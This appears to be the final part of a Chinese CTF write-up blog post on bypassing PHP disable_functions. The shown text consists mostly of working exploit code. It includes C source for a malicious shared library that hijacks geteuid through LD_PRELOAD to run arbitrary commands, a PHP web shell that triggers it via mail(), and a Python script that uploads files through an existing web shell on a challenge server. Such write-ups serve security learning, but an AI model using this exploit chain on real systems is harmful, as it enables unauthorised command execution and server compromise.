+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.246.234.136/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu?c=var_dump(get_defined_functions());</span><br></pre></td></tr></table></figure>
+
+<p>没有<code>imap_open</code></p>
+<p><code>mail</code>存在利用<code>LD_PRELOAD</code> 进行绕过</p>
+<p>原理可参见</p>
+<p><code>https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/</code></p>
+<p>参考这个<a href="https://github.com/tothi/ctfs/tree/master/alictf-2016/homework" target="_blank" rel="noopener">https://github.com/tothi/ctfs/tree/master/alictf-2016/homework</a> 打</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, cmd);</span><br><span class="line">  <span class="built_in">strcat</span>(buf, <span class="string">" &gt; /tmp/_0utput.txt"</span>);</span><br><span class="line">  system(buf);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *cmd;</span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">  unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((cmd = getenv(<span class="string">"_evilcmd"</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    payload(cmd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传evil.so</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($_FILES[&apos;evil&apos;][&apos;tmp_name&apos;],&apos;/tmp/evil.so&apos;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://35.246.234.136/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu"</span></span><br><span class="line"></span><br><span class="line">param = &#123;<span class="string">"c"</span>:<span class="string">"move_uploaded_file($_FILES['evil']['tmp_name'],'/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.php');echo 'ok';var_dump(scandir('/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72'));"</span>&#125;</span><br><span class="line">files = [(<span class="string">'evil'</span>,(<span class="string">'evil.so'</span>,open(<span class="string">"shell.php"</span>,<span class="string">"rb"</span>),<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url, files=files, params=param)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$r1 = putenv(<span class="string">"LD_PRELOAD=/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/evil.so"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"putenv: $r1 &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$r2 = putenv(<span class="string">"_evilcmd=$cmd"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"putenv: $r2 &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$r3 = mail(<span class="string">"a@example.com"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"mail: $r3 &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">"/tmp/_0utput.txt"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/waderwu/notebook/img/image-20190122202414731.png" alt="image-20190122202414731"></p>
+<p>终于能执行命令了！</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/10/06/ezdotso-writeup-by-race-condition/" rel="next" title="ezdotso通过php临时文件竞争解法">
+                  <i class="fa fa-chevron-left"></i> ezdotso通过php临时文件竞争解法
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码分析"><span class="nav-number">2.</span> <span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路一"><span class="nav-number">2.1.</span> <span class="nav-text">思路一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路二"><span class="nav-number">2.2.</span> <span class="nav-text">思路二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuyx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuyx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/muse.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
